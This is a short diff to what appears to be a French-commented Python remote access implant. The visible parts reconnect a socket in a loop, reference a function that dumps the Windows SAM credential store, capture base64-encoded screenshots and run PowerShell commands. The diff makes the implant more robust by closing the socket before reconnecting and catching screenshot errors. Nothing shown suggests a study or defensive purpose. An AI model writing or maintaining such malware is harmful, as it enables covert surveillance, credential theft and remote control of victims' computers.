@@ -76,6 +76,10 @@ def main():
                         break
 
         except:
+            try:
+                sock.close()
+            except:
+                pass
             print("[*] Reconnexion dans 5s...")
             time.sleep(5)
 
@@ -139,11 +143,14 @@ def dump_sam():
 
 # prend un screenshot et le renvoie encode en base64
 def take_screenshot():
-    import mss
-    with mss.mss() as sct:
-        img = sct.grab(sct.monitors[1])
-        png = mss.tools.to_png(img.rgb, img.size)
-        return base64.b64encode(png).decode()
+    try:
+        import mss
+        with mss.mss() as sct:
+            img = sct.grab(sct.monitors[1])
+            png = mss.tools.to_png(img.rgb, img.size)
+            return base64.b64encode(png).decode()
+    except Exception as e:
+        return f"Erreur screenshot: {e}"
 
 
 # execute une commande powershell et renvoie la sortie
